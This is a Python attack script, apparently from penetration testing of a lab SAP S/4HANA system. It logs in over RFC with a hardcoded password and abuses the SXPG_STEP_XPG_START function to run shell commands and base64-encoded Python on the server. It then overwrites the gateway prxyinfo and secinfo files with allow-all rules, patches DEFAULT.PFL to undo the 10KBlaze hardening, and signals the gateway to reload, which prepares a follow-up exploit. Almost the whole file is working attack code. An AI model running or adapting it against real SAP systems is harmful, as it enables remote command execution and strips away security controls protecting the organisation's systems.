#!/usr/bin/env python3
"""
test_rfc_fix.py — Fix GW proxy ACL to allow our IP, then run SAPXPG exploit.

Two hardening measures blocking the exploit:
  1. gw/acl_mode_proxy = 1  (prxyinfo file missing → deny all proxy)
  2. gw/reg_no_conn_info = 255 (blocks NILIST injection betrusted path)

Fix (1) by creating prxyinfo with a permissive rule.
Fix (2) by patching DEFAULT.PFL + restarting GW, OR by trying with (1) only first.

NOTE: The TCP prxyinfo check happens BEFORE the GwHostTab check, so fixing (1)
might be sufficient if T_75 points to a loopback/local sapxpg destination.
"""
import sys, time, base64
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_rfc_ctypes import RFCConnection

SDK_PATH = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
HOST='192.168.2.209'; SYSNR='00'; CLIENT='001'; USER='joris'; PASSWD='SccAdmin123!'
ATT_IP='192.168.2.210'

BASE = dict(TARGET="", DESTINATION="", STDINCNTL="R", STDOUTCNTL="M",
            STDERRCNTL="M", TRACECNTL="0", TERMCNTL="C", TRACELEVEL="0",
            LONG_PARAMS="", CONNCNTL="H")

def sxpg(conn, prog, params, label):
    print(f"\n[CMD] {label}")
    print(f"  {prog} {params}")
    kw = dict(BASE, EXTPROG=prog, PARAMS=params)
    try:
        try:   r = conn.call("SXPG_STEP_XPG_START", MXROW=9999, **kw)
        except Exception as e:
            if "MXROW" in str(e) or "RFC_INVALID" in str(e):
                r = conn.call("SXPG_STEP_XPG_START", **kw)
            else:
                print(f"  ERROR: {e}"); return
    except Exception as e:
        print(f"  ERROR: {e}"); return
    for row in r.get("LOG", []):
        line = (row.get("MESSAGE") or row.get("LINE") or row.get("TEXT") or "") if isinstance(row, dict) else str(row)
        line = line.rstrip()
        if line: print(f"  {line}")
    print(f"  [exit={r.get('STATUS','?')!r}]")


def py_exec(conn, code: str, label: str):
    """Run Python code on SAP server via base64-encoded exec()."""
    b64 = base64.b64encode(code.encode()).decode()
    params = f"-c exec(__import__('base64').b64decode('{b64}').decode())"
    sxpg(conn, "/usr/bin/python3", params, label)


def main():
    print(f"[*] Connecting...")
    with RFCConnection(sdk_path=SDK_PATH, ashost=HOST, sysnr=SYSNR,
                       client=CLIENT, user=USER, passwd=PASSWD, lang="EN") as conn:
        print("[+] OK\n")

        # Step 1: Look up DEST T_75 in RFC destinations
        print("[*] Looking up RFC destination T_75...")
        try:
            r = conn.call("RFC_READ_TABLE",
                          QUERY_TABLE="RFCDES",
                          DELIMITER="|",
                          FIELDS=[{"FIELDNAME": "RFCDEST"}, {"FIELDNAME": "RFCTYPE"},
                                  {"FIELDNAME": "RFCOPTIONS"}],
                          OPTIONS=[{"TEXT": "RFCDEST = 'T_75'"}],
                          ROWCOUNT=5)
            for row in r.get("DATA", []):
                print(f"  RFCDES: {row}")
        except Exception as e:
            print(f"  RFC_READ_TABLE error: {e}")

        # Step 2: Write a permissive prxyinfo file
        print("\n[*] Creating permissive prxyinfo file...")
        prxy_content = "#VERSION=2\nP TP=* HOST=* ACCESS=* USER=*\n"
        py_exec(conn,
                f"open('/usr/sap/S4H/SYS/global/prxyinfo','w').write({prxy_content!r})",
                "Write permissive prxyinfo")

        # Verify it was written
        sxpg(conn, "/usr/bin/cat", "/usr/sap/S4H/SYS/global/prxyinfo",
             "Verify prxyinfo was written")

        # Step 3: Make secinfo also fully permissive (for our fake server registration)
        print("\n[*] Making secinfo permissive...")
        sec_content = "#VERSION=2\nP USER=* USER-HOST=* HOST=* TP=*\n"
        py_exec(conn,
                f"open('/usr/sap/S4H/SYS/global/secinfo','w').write({sec_content!r})",
                "Write permissive secinfo")

        sxpg(conn, "/usr/bin/cat", "/usr/sap/S4H/SYS/global/secinfo",
             "Verify secinfo was written")

        # Step 4: Also need to fix gw/reg_no_conn_info for the NILIST path
        # The DEFAULT.PFL has gw/reg_no_conn_info = 255 — change it to 0
        # and remove gw/acl_mode_proxy restriction
        print("\n[*] Patching DEFAULT.PFL to remove 10KBlaze hardening...")
        py_exec(conn, """
content = open('/usr/sap/S4H/SYS/profile/DEFAULT.PFL').read()
new = content.replace('gw/reg_no_conn_info = 255', 'gw/reg_no_conn_info = 0')
new = new.replace('gw/acl_mode_proxy = 1', 'gw/acl_mode_proxy = 0')
open('/usr/sap/S4H/SYS/profile/DEFAULT.PFL','w').write(new)
print('DEFAULT.PFL patched')
""".strip(), "Patch DEFAULT.PFL: reg_no_conn_info=0, acl_mode_proxy=0")

        # Verify the patch
        sxpg(conn, "/usr/bin/grep", "gw/ /usr/sap/S4H/SYS/profile/DEFAULT.PFL",
             "Verify DEFAULT.PFL patch")

        # Step 5: Get GW process PID and send SIGHUP to reload config/ACL
        print("\n[*] Finding GW process PID and sending reload signal...")
        sxpg(conn, "/bin/ps", "-aux",
             "Find SAP GW process")

        # Get GW PID from /proc or pidof
        py_exec(conn, """
import subprocess, os, signal
# find gwrd/sapgw00 process
out = subprocess.check_output(['/usr/bin/pgrep', '-f', 'SAP_S4H_00_GW'], text=True).strip()
pids = [int(p) for p in out.split() if p]
print('GW PIDs:', pids)
for pid in pids:
    try:
        os.kill(pid, signal.SIGHUP)
        print(f'Sent SIGHUP to {pid}')
    except Exception as e:
        print(f'SIGHUP to {pid} failed: {e}')
""".strip(), "Send SIGHUP to GW to reload ACL/config")

        # Also try SIGUSR1 (some SAP GW versions use this for ACL reload)
        py_exec(conn, """
import subprocess, os, signal
try:
    out = subprocess.check_output(['/usr/bin/pgrep', '-f', 'SAP_S4H_00_GW'], text=True).strip()
    pids = [int(p) for p in out.split() if p]
    for pid in pids:
        os.kill(pid, signal.SIGUSR1)
        print(f'Sent SIGUSR1 to {pid}')
except Exception as e:
    print(f'SIGUSR1 failed: {e}')
""".strip(), "Send SIGUSR1 to GW (alternate reload signal)")

        # Step 6: Wait for GW to reload ACL, then try SAPXPG
        print("\n[*] Waiting 5s for GW to reload ACL files...")
        time.sleep(5)

        print("\n[*] Done. Now run test_combined_exploit.py to try the exploit.")

if __name__ == '__main__':
    main()
